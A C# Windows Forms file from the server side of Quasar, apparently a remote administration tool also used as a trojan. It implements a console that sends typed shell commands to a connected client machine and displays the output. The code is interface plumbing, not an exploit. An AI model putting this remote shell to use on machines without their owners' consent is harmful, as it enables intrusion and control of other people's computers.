using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteShell : Form
    {
        /// <summary>
        /// The client which can be used for the remote shell.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        public readonly RemoteShellHandler RemoteShellHandler;

        /// <summary>
        /// Holds the opened remote shell form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmRemoteShell> OpenedForms = new Dictionary<Client, FrmRemoteShell>();

        /// <summary>
        /// Creates a new remote shell form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the remote shell form.</param>
        /// <returns>
        /// Returns a new remote shell form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmRemoteShell CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteShell f = new FrmRemoteShell(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmRemoteShell"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the remote shell form.</param>
        public FrmRemoteShell(Client client)
        {
            _connectClient = client;
            RemoteShellHandler = new RemoteShellHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
        }

        /// <summary>
        /// Registers the remote shell message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            RemoteShellHandler.ProgressChanged += CommandOutput;
            RemoteShellHandler.CommandError += CommandError;
            MessageHandler.Register(RemoteShellHandler);
        }

        /// <summary>
        /// Unregisters the remote shell message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(RemoteShellHandler);
            RemoteShellHandler.ProgressChanged -= CommandOutput;
            RemoteShellHandler.CommandError -= CommandError;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever the remote shell writes to stdout.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="output">The output to write.</param>
        private void CommandOutput(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = Color.WhiteSmoke;
            txtConsoleOutput.AppendText(output);
        }

        /// <summary>
        /// Called whenever the remote shell writes to stderr.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="output">The error output to write.</param>
        private void CommandError(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = Color.Red;
            txtConsoleOutput.AppendText(output);
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;
            this.Text = WindowHelper.GetWindowTitle("Remote Shell", _connectClient);
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            RemoteShellHandler.Dispose();
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            NativeMethodsHelper.ScrollToBottom(txtConsoleOutput.Handle);
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                string input = txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                txtConsoleInput.Text = string.Empty;

                // Split based on the space key.
                string[] splitSpaceInput = input.Split(' ');
                // Split based on the null key.
                string[] splitNullInput = input.Split(' ');

                // We have an exit command.
                if (input == "exit" ||
                    ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit") ||
                    ((splitNullInput.Length > 0) && splitNullInput[0] == "exit"))
                {
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsoleOutput.Text = string.Empty;
                            break;
                        default:
                            RemoteShellHandler.SendCommand(input);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char) 2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }
    }
}